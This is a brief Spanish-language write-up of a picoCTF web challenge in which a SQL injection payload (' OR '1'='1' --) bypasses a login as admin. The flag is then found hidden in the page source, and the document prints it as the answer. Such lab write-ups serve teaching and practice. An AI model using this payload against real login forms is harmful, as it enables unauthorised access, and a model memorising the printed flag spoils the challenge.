#Software #Hacking #WebExplotation #Web #Internet 
# Definición
Can you login to this website?Try to login [here](http://saturn.picoctf.net:51734/).
# Hints
- `admin` is the user you want to login as.
# Solución
Primero al entrar vemos un login, y como nos sugiere la pista intentamos ingresar como admin.

Pero esto falla.
```
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'

# Login failed.
```

Por lo que probamos usar [[Inyección SQL]], y logramos entrar:
```
username: admin
password: ' OR '1'='1' --
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR '1'='1' --'

# Logged in! But can you see the flag, it is in plainsight.
```

Pero no vemos la bandera, por lo que decidimos inspeccionar la página, y encontramos la bandera.
```html
|   |   |
|---|---|
||<pre>username: admin|
||password: &#039; OR &#039;1&#039;=&#039;1&#039; --|
||SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; OR &#039;1&#039;=&#039;1&#039; --&#039;|
||</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>|
```
## Respuesta
picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}